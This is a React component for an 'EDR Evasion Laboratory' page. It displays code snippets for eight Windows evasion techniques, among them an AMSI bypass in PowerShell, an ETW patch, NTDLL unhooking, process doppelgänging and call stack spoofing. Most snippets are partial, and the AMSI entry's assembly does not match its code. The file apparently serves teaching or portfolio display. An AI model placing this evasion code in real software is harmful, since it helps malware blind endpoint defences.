import React, { useState } from 'react';
import { Shield, ShieldOff, Code, CheckCircle, XCircle } from 'lucide-react';
import ScrollReveal from '../UI/ScrollReveal';

interface EvasionTechnique {
    id: string;
    name: string;
    category: 'syscall' | 'injection' | 'unhooking' | 'obfuscation';
    difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
    description: string;
    bypasses: string[];
    code: string;
    assembly?: string;
    detected: boolean;
}

const evasionTechniques: EvasionTechnique[] = [
    {
        id: 'direct-syscall',
        name: 'Direct Syscalls',
        category: 'syscall',
        difficulty: 'Medium',
        description: 'Bypass user-mode hooks by directly invoking syscalls, skipping NTDLL.dll',
        bypasses: ['User-mode hooks', 'API monitoring', 'Inline hooks'],
        detected: false,
        code: `// Direct syscall implementation
NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);`,
        assembly: `; Direct syscall - NtAllocateVirtualMemory
mov r10, rcx
mov eax, 0x18      ; Syscall number
syscall
ret`
    },
    {
        id: 'heavens-gate',
        name: "Heaven's Gate",
        category: 'syscall',
        difficulty: 'Expert',
        description: 'WoW64 bypass - transition from 32-bit to 64-bit to evade 32-bit hooks',
        bypasses: ['32-bit hooks', 'WoW64 monitoring'],
        detected: false,
        code: `// Heaven's Gate - 32-bit to 64-bit transition
__declspec(naked) void HeavensGate() {
    __asm {
        call $+5
        add dword ptr [esp], 5
        retf  // Far return to 64-bit
    }
}`,
        assembly: `; Transition to 64-bit mode
call $+5
add dword ptr [esp], 5
retf

; Now in 64-bit mode
mov eax, syscall_num
syscall`
    },
    {
        id: 'process-doppelganging',
        name: 'Process Doppelgänging',
        category: 'injection',
        difficulty: 'Expert',
        description: 'NTFS transaction-based process injection to evade detection',
        bypasses: ['Process creation monitoring', 'Image load callbacks'],
        detected: false,
        code: `// Process Doppelgänging
HANDLE hTransaction = CreateTransaction(...);
HANDLE hFile = CreateFileTransacted(L"C:\\\\Windows\\\\System32\\\\svchost.exe", 
    ..., hTransaction, ...);

// Overwrite with malicious PE
WriteFile(hFile, maliciousPE, size, ...);

// Create process from transaction
NtCreateProcessEx(&hProcess, ..., hTransaction);

// Rollback transaction (file reverts)
RollbackTransaction(hTransaction);`
    },
    {
        id: 'amsi-bypass',
        name: 'AMSI Bypass',
        category: 'unhooking',
        difficulty: 'Medium',
        description: 'Patch AMSI.dll to disable Windows Antimalware Scan Interface',
        bypasses: ['AMSI scanning', 'PowerShell logging'],
        detected: false,
        code: `// AMSI bypass - patch AmsiScanBuffer
$a = [Ref].Assembly.GetTypes();
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b.GetFields('NonPublic,Static');
        ForEach($d in $c) {
            if ($d.Name -like "*Context") {
                $d.SetValue($null, [IntPtr]::Zero);
            }
        }
    }
}`,
        assembly: `; Patch AmsiScanBuffer return value
mov eax, 0x80070057  ; E_INVALIDARG
ret`
    },
    {
        id: 'etw-patching',
        name: 'ETW Patching',
        category: 'unhooking',
        difficulty: 'Hard',
        description: 'Disable Event Tracing for Windows to blind EDR telemetry',
        bypasses: ['ETW logging', 'Sysmon', 'EDR telemetry'],
        detected: false,
        code: `// Patch EtwEventWrite
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");

DWORD oldProtect;
VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

// Patch with 'ret'
*(BYTE*)etwEventWrite = 0xC3;

VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);`,
        assembly: `; Patch EtwEventWrite
; Before: mov r10, rcx; mov eax, ...
; After:  ret (0xC3)
0xC3`
    },
    {
        id: 'unhook-ntdll',
        name: 'NTDLL Unhooking',
        category: 'unhooking',
        difficulty: 'Medium',
        description: 'Restore original NTDLL.dll from disk to remove EDR hooks',
        bypasses: ['User-mode hooks', 'API interception'],
        detected: false,
        code: `// Unhook NTDLL
HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll", ...);
HANDLE hMapping = CreateFileMappingA(hFile, ...);
LPVOID pMapping = MapViewOfFile(hMapping, ...);

// Get .text section from clean NTDLL
PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMapping;
PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + pDos->e_lfanew);

// Copy clean .text over hooked NTDLL
memcpy(hookedNtdll, cleanNtdll, textSize);`
    },
    {
        id: 'sleep-obfuscation',
        name: 'Sleep Obfuscation',
        category: 'obfuscation',
        difficulty: 'Hard',
        description: 'Encrypt beacon in memory during sleep to evade memory scanning',
        bypasses: ['Memory scanning', 'Beacon detection'],
        detected: false,
        code: `// Sleep obfuscation
void ObfuscatedSleep(DWORD ms) {
    // XOR encrypt entire .text section
    XorEncrypt(imageBase, imageSize, key);
    
    // Change memory protection to RW (no execute)
    VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &old);
    
    // Sleep
    Sleep(ms);
    
    // Restore
    VirtualProtect(imageBase, imageSize, PAGE_EXECUTE_READ, &old);
    XorDecrypt(imageBase, imageSize, key);
}`
    },
    {
        id: 'call-stack-spoofing',
        name: 'Call Stack Spoofing',
        category: 'obfuscation',
        difficulty: 'Expert',
        description: 'Spoof call stack to hide malicious origin during sensitive API calls',
        bypasses: ['Call stack inspection', 'Behavioral detection'],
        detected: false,
        code: `// Spoof call stack
void SpoofedCall(FARPROC targetFunc) {
    // Save original return address
    PVOID originalRet = _ReturnAddress();
    
    // Replace with legitimate address
    PVOID spoofedRet = GetLegitimateAddress();
    
    // Modify stack frame
    *(PVOID*)((BYTE*)_AddressOfReturnAddress()) = spoofedRet;
    
    // Call target
    targetFunc();
    
    // Restore
    *(PVOID*)((BYTE*)_AddressOfReturnAddress()) = originalRet;
}`,
        assembly: `; Stack spoofing
push rbp
mov rbp, rsp
push legitimate_ret_addr  ; Spoof
call target_function
pop rax                   ; Clean up
pop rbp
ret`
    }
];

const EDREvasionLab: React.FC = () => {
    const [selectedTechnique, setSelectedTechnique] = useState<EvasionTechnique | null>(null);
    const [detectionMatrix, setDetectionMatrix] = useState<{ [key: string]: boolean }>({});

    const categoryColors = {
        syscall: '#3b82f6',
        injection: '#8b5cf6',
        unhooking: '#10b981',
        obfuscation: '#f59e0b'
    };

    const difficultyColors = {
        Easy: '#10b981',
        Medium: '#f59e0b',
        Hard: '#ef4444',
        Expert: '#8b5cf6'
    };

    const toggleDetection = (id: string) => {
        setDetectionMatrix(prev => ({ ...prev, [id]: !prev[id] }));
    };

    return (
        <div className="w-full max-w-7xl mx-auto space-y-6">
            {/* Header */}
            <div className="text-center space-y-2">
                <h2 className="text-3xl font-bold">EDR Evasion Laboratory</h2>
                <p className="text-muted-foreground">Advanced techniques to bypass Endpoint Detection & Response</p>
            </div>

            {/* Technique Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {evasionTechniques.map((technique, index) => {
                    const isDetected = detectionMatrix[technique.id] || false;

                    return (
                        <ScrollReveal key={technique.id} variant="slideUp" delay={index * 50}>
                            <button
                                onClick={() => setSelectedTechnique(technique)}
                                className="w-full text-left border border-border rounded-lg p-4 hover:border-primary/50 transition-all group"
                                style={{ borderLeftWidth: '4px', borderLeftColor: categoryColors[technique.category] }}
                            >
                                <div className="flex items-start justify-between mb-2">
                                    <div className="flex-1">
                                        <h3 className="font-bold group-hover:text-primary transition-colors">{technique.name}</h3>
                                        <p className="text-xs text-muted-foreground mt-1">{technique.description}</p>
                                    </div>
                                    <div onClick={(e) => { e.stopPropagation(); toggleDetection(technique.id); }}>
                                        {isDetected ? (
                                            <XCircle className="h-6 w-6 text-red-500" />
                                        ) : (
                                            <CheckCircle className="h-6 w-6 text-green-500" />
                                        )}
                                    </div>
                                </div>

                                <div className="flex items-center gap-2 mt-3">
                                    <span
                                        className="text-xs px-2 py-1 rounded"
                                        style={{
                                            backgroundColor: `${difficultyColors[technique.difficulty]}20`,
                                            color: difficultyColors[technique.difficulty]
                                        }}
                                    >
                                        {technique.difficulty}
                                    </span>
                                    <span
                                        className="text-xs px-2 py-1 rounded capitalize"
                                        style={{
                                            backgroundColor: `${categoryColors[technique.category]}20`,
                                            color: categoryColors[technique.category]
                                        }}
                                    >
                                        {technique.category}
                                    </span>
                                </div>

                                <div className="mt-3 flex flex-wrap gap-1">
                                    {technique.bypasses.slice(0, 2).map((bypass, i) => (
                                        <span key={i} className="text-xs bg-secondary px-2 py-1 rounded">
                                            {bypass}
                                        </span>
                                    ))}
                                    {technique.bypasses.length > 2 && (
                                        <span className="text-xs text-muted-foreground">
                                            +{technique.bypasses.length - 2} more
                                        </span>
                                    )}
                                </div>
                            </button>
                        </ScrollReveal>
                    );
                })}
            </div>

            {/* Detection Matrix */}
            <div className="border border-border rounded-lg p-6">
                <h3 className="font-semibold text-lg mb-4">Detection Matrix</h3>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="text-center p-4 bg-green-500/10 rounded-lg">
                        <div className="text-3xl font-bold text-green-500">
                            {evasionTechniques.filter(t => !detectionMatrix[t.id]).length}
                        </div>
                        <div className="text-xs text-muted-foreground mt-1">Bypassed</div>
                    </div>
                    <div className="text-center p-4 bg-red-500/10 rounded-lg">
                        <div className="text-3xl font-bold text-red-500">
                            {evasionTechniques.filter(t => detectionMatrix[t.id]).length}
                        </div>
                        <div className="text-xs text-muted-foreground mt-1">Detected</div>
                    </div>
                    <div className="text-center p-4 bg-blue-500/10 rounded-lg">
                        <div className="text-3xl font-bold text-blue-500">
                            {evasionTechniques.filter(t => t.category === 'syscall').length}
                        </div>
                        <div className="text-xs text-muted-foreground mt-1">Syscall Techniques</div>
                    </div>
                    <div className="text-center p-4 bg-purple-500/10 rounded-lg">
                        <div className="text-3xl font-bold text-purple-500">
                            {evasionTechniques.filter(t => t.difficulty === 'Expert').length}
                        </div>
                        <div className="text-xs text-muted-foreground mt-1">Expert Level</div>
                    </div>
                </div>
            </div>

            {/* Technique Detail Modal */}
            {selectedTechnique && (
                <div
                    className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
                    onClick={() => setSelectedTechnique(null)}
                >
                    <div
                        className="bg-background border border-border rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto"
                        onClick={(e) => e.stopPropagation()}
                    >
                        {/* Header */}
                        <div className="sticky top-0 bg-background border-b border-border p-6">
                            <div className="flex items-start justify-between">
                                <div>
                                    <h2 className="text-2xl font-bold">{selectedTechnique.name}</h2>
                                    <p className="text-muted-foreground mt-1">{selectedTechnique.description}</p>
                                    <div className="flex items-center gap-2 mt-3">
                                        <span
                                            className="text-xs px-2 py-1 rounded"
                                            style={{
                                                backgroundColor: `${difficultyColors[selectedTechnique.difficulty]}20`,
                                                color: difficultyColors[selectedTechnique.difficulty]
                                            }}
                                        >
                                            {selectedTechnique.difficulty}
                                        </span>
                                        <span
                                            className="text-xs px-2 py-1 rounded capitalize"
                                            style={{
                                                backgroundColor: `${categoryColors[selectedTechnique.category]}20`,
                                                color: categoryColors[selectedTechnique.category]
                                            }}
                                        >
                                            {selectedTechnique.category}
                                        </span>
                                    </div>
                                </div>
                                <button
                                    onClick={() => setSelectedTechnique(null)}
                                    className="text-muted-foreground hover:text-foreground"
                                >
                                    ✕
                                </button>
                            </div>
                        </div>

                        {/* Content */}
                        <div className="p-6 space-y-6">
                            {/* Bypasses */}
                            <div>
                                <h3 className="font-semibold mb-2 flex items-center gap-2">
                                    <ShieldOff className="h-4 w-4" />
                                    Bypasses
                                </h3>
                                <div className="flex flex-wrap gap-2">
                                    {selectedTechnique.bypasses.map((bypass, i) => (
                                        <span key={i} className="text-sm bg-green-500/10 text-green-500 px-3 py-1 rounded-full">
                                            ✓ {bypass}
                                        </span>
                                    ))}
                                </div>
                            </div>

                            {/* Code */}
                            <div>
                                <h3 className="font-semibold mb-2 flex items-center gap-2">
                                    <Code className="h-4 w-4" />
                                    Implementation
                                </h3>
                                <pre className="p-4 text-xs font-mono bg-black/50 text-green-400 rounded-lg overflow-x-auto">
                                    {selectedTechnique.code}
                                </pre>
                            </div>

                            {/* Assembly (if available) */}
                            {selectedTechnique.assembly && (
                                <div>
                                    <h3 className="font-semibold mb-2">Assembly Code</h3>
                                    <pre className="p-4 text-xs font-mono bg-black/50 text-cyan-400 rounded-lg overflow-x-auto">
                                        {selectedTechnique.assembly}
                                    </pre>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default EDREvasionLab;
